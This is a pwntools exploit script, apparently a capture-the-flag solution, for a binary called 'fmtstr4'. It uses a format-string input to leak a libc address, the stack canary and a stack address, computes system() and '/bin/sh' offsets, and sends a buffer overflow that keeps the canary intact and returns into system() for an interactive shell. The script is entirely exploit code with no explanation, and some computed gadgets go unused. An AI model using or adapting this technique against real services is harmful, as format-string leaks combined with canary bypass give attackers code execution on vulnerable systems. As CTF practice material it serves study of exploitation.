#!/bin/python3
from pwn import *
exe = ELF('./fmtstr4')
context.terminal = ['alacritty','-e']
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.31.so')

p = process(exe.path,env={"LD_PRELOAD": libc.path})
gdb.attach(p,gdbscript='''
        b *main+310
        b*main+349
        b*main+383
        c


           ''')
userid = b'01234456789%23$p%21$p%27$p'
password = b'&WPAbC&M!%8S5X#W'
input()
p.sendlineafter(b'ID: ',userid )
p.sendlineafter(b'Password: ',password)
p.recvuntil(b'6789')
leak = p.recvline().split(b'0x')
lib_start_call_main = int(b'0x' + leak[1],16)
canary_leak = int(b'0x' + leak[2],16)
stack_address_leak = int(b'0x' + leak[3],16)
base_libc = lib_start_call_main - 163024
system_libc = base_libc + 325472
bin_sh_libc = base_libc + 0x19ae34
binary_base = base_libc + 2154496
pop_rdi = binary_base + 5203
bin_sh_on_stack = stack_address_leak - 280
#log.info('leak: ' + hex(leak))
log.info('lib_start_call_main: ' + hex(lib_start_call_main))
log.info('stack_address_leak: ' + hex(stack_address_leak))
log.info('base_libc: ' + hex(base_libc))
log.info('canary_leak: ' + hex(canary_leak))
log.info('binary_base: ' + hex(binary_base))
log.info('system_libc: ' + hex(system_libc))
log.info('bin_sh_libc: ' + hex(bin_sh_libc))
log.info('pop_rdi: ' + hex(pop_rdi))
payload = b'\x00'*56
payload += p64(canary_leak)
payload += p64(0)  
payload += p64(system_libc) 
p.sendlineafter(b'Enter your secret: ',payload )
p.interactive()

